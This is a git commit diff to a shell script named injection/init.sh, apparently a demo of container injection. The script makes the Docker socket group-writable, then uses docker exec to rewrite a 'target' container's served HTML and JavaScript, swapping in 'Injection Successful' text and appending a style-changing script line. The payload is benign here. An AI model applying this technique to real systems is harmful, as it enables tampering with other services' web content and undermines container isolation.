ebef8491c51e130f1ad0d7e03cdf1e287453bf9a
chiefmikey <wolfemikl@gmail.com>
2021-08-18 14:31:25 -0600

    Inject html

--- injection/init.sh
+++ injection/init.sh
@@ -4,5 +4,9 @@ apk update && apk upgrade
 apk add --no-cache docker sudo
 addgroup root docker
 chmod -R 774 /var/run/docker.sock
-sudo docker run --cap-add NET_ADMIN
-sudo docker exec name-generator_db /cassandra/cqlsh.sh
+sudo docker exec target sh -c "
+   sed -i 's/Hullo Wurld/Injection Successful/g' /koa/client/public/index.js &&
+   sed -i 's/Index/Injected/g' /koa/client/public/index.html &&
+   echo 'document.getElementById(\"app\").style.color = \"red\";' >> /koa/client/public/index.js
+"
+echo "Target container has been injected"
